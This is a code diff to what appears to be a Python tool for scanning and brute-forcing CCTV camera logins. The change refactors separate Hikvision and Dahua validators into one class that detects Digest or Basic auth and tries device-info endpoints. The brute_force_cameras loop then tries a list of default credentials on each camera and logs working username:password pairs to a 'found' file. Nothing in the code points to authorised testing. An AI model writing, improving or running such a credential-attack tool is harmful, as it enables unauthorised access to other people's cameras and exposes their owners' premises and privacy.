@@ -63,64 +63,71 @@ DEFAULT_CREDENTIALS = [
 ]
 
 
-class HikvisionValidator:
-    """Validates Hikvision camera password using ISAPI protocol"""
-    DEVICE_INFO_ENDPOINT = "/ISAPI/System/deviceInfo"
+class CameraValidator:
+    """Universal camera validator with auth-scheme detection"""
+    HIK_PATH = "/ISAPI/System/deviceInfo"
+    DAHUA_PATH = "/cgi-bin/magicBox.cgi?action=getDeviceType"
     
     def __init__(self, ip, username, password, port=80):
         self.ip = ip
         self.username = username
         self.password = password
         self.port = port
-        self.timeout = 1.5 # Short timeout for speed
-    
-    def validate(self):
+        self.timeout = 3.0
+        self.session = requests.Session()
+        self.session.verify = False
+
+    def validate(self, hint=None):
         if not HAS_REQUESTS:
             return False, "requests library not installed"
+        
+        url_base = f"http://{self.ip}:{self.port}"
+        
+        # 1. Detect Auth Scheme and Brand
         try:
-            url = f"http://{self.ip}:{self.port}{self.DEVICE_INFO_ENDPOINT}"
-            response = requests.get(
-                url,
-                auth=HTTPDigestAuth(self.username, self.password),
-                timeout=self.timeout,
-                verify=False,
-                allow_redirects=False
-            )
-            if response.status_code == 200:
-                return True, "Authenticated"
-            return False, f"HTTP {response.status_code}"
+            # Try Hikvision path first by default as probe
+            probe_url = url_base + self.HIK_PATH
+            response = self.session.get(probe_url, timeout=self.timeout, allow_redirects=False)
+            
+            auth_header = response.headers.get('WWW-Authenticate', '').lower()
+            use_digest = 'digest' in auth_header
+            
+            # 2. Try Authenticated Request
+            paths_to_try = []
+            if hint == "Hikvision" or "hik" in auth_header:
+                paths_to_try = [self.HIK_PATH, self.DAHUA_PATH]
+            elif hint == "Dahua" or "dahua" in auth_header or "web service" in auth_header:
+                paths_to_try = [self.DAHUA_PATH, self.HIK_PATH]
+            else:
+                paths_to_try = [self.HIK_PATH, self.DAHUA_PATH]
+
+            for path in paths_to_try:
+                url = url_base + path
+                auth = HTTPDigestAuth(self.username, self.password) if use_digest else (self.username, self.password)
+                
+                try:
+                    resp = self.session.get(url, auth=auth, timeout=self.timeout, allow_redirects=False)
+                    if resp.status_code == 200:
+                        return True, f"Authenticated via {'Digest' if use_digest else 'Basic'} on {path}"
+                except:
+                    continue
+                    
+            return False, "Authentication failed (Wrong credentials or scheme)"
+            
+        except requests.exceptions.Timeout:
+            return False, "Connection timeout"
         except Exception as e:
             return False, str(e)
 
 
-class DahuaValidator:
-    """Validates Dahua/Anjhua camera password"""
-    MAGIC_BOX_ENDPOINT = "/cgi-bin/magicBox.cgi?action=getDeviceType"
-    
-    def __init__(self, ip, username, password, port=80):
-        self.ip = ip
-        self.username = username
-        self.password = password
-        self.port = port
-        self.timeout = 1.5 # Short timeout for speed
-    
+# Keep old names for compatibility if needed, but point to new logic
+class HikvisionValidator(CameraValidator):
     def validate(self):
-        if not HAS_REQUESTS:
-            return False, "requests library not installed"
-        try:
-            url = f"http://{self.ip}:{self.port}{self.MAGIC_BOX_ENDPOINT}"
-            response = requests.get(
-                url,
-                auth=HTTPDigestAuth(self.username, self.password),
-                timeout=self.timeout,
-                verify=False,
-                allow_redirects=False
-            )
-            if response.status_code == 200:
-                return True, "Authenticated"
-            return False, f"HTTP {response.status_code}"
-        except Exception as e:
-            return False, str(e)
+        return super().validate(hint="Hikvision")
+
+class DahuaValidator(CameraValidator):
+    def validate(self):
+        return super().validate(hint="Dahua")
 
 # Configuration
 CCTV_OUTPUT = "CCTV_Found.txt"
@@ -694,19 +701,14 @@ def brute_force_cameras(camera_list, output_widget=None):
         
         log(f"[*] Testing {ip}:{port} ({cam_type})...", Fore.CYAN)
         
-        # Determine validator
-        is_dahua = "WEB SERVICE" == cam_type or "Dahua" in cam_type
-        
         found_login = False
         for user, pwd in DEFAULT_CREDENTIALS:
-            if is_dahua:
-                validator = DahuaValidator(ip, user, pwd, port)
-            else:
-                validator = HikvisionValidator(ip, user, pwd, port)
+            # Use the universal validator with the detected type as a hint
+            validator = CameraValidator(ip, user, pwd, port)
+            success, msg = validator.validate(hint=cam_type)
             
-            success, msg = validator.validate()
             if success:
-                log(f"    [+] SUCCESS: {ip}:{port} | {user}:{pwd}", Fore.GREEN)
+                log(f"    [+] SUCCESS: {ip}:{port} | {user}:{pwd} ({msg})", Fore.GREEN)
                 success_count += 1
                 found_login = True
                 break
